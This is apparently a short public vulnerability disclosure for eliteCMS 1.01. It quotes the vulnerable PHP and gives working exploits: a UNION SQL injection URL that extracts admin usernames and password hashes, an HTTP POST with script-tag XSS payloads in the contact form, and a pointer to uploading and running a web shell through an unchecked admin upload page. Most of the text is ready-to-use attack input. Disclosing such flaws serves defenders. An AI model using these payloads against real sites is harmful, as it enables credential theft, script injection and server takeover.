eliteCMS 1.01 (SQL/XSS) Multiple Remote Vulnerabilities
=======================================================


# eliteCMS 1.01 (SQL/XSS) Multiple Remote Vulns
# by xeno_hive
# greets to daganarus, dearest of all my friends.

# SQL injection (requires magic_quotes = off)

->/includes/functions.php
---------------------------------
89. function get_page_settings() {
...
92. $query = "SELECT * FROM pages WHERE id = &#039;{$_GET[&#039;page&#039;]}&#039;";
93. $result = mysql_query($query);
94. confirm_query($result);
95. $page_settings = mysql_fetch_array($result); 
96. return $page_settings; }
...
294. echo $page_settings[&#039;title&#039;];
---------------------------------

Exploit => index.php?page=-1&#039;+union+select+1,concat(user_name,0x3a,h_password),3,4,5,6,7,8,9,10,11+from+users+limit+0,1/*
then look at browser&#039;s title.


# XSS (passive)
(if contact form is enabled)

->/includes/contact_form.php
---------------------------------
36. $mailTo = $settings[&#039;site_email&#039;];
37. $subject = "Feedback email from your eliteCMS website";
38. $name = $_POST[&#039;name&#039;];
39. $sender_email = $_POST[&#039;sender_email&#039;];
40. $message = $_POST[&#039;message&#039;];
...
54. $sendmail =  @mail($mailTo, $subject, $body, $headers);
---------------------------------

So attacker can send mail with http tags.
---------------------------------
61. $successMSG = "<span class=\"successMsg\">Thank you dear <span>$name</span> your message has been send
      successfully.</span>";
---------------------------------

And he can insert tags into the page.

Exploit => POST-packet
---------------------------------
POST /index.php?page=3 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
Host: localhost

name=<script>alert("Name")</script>
&sender_email=someone@evil.com
&message=<script>alert("Message")</script>
&email=Send Email
---------------------------------

# Admin&#039;s file upload script without extension checking
Upload your shell at /admin/manage_uploads.php. Then use it at /uploads/shell.php




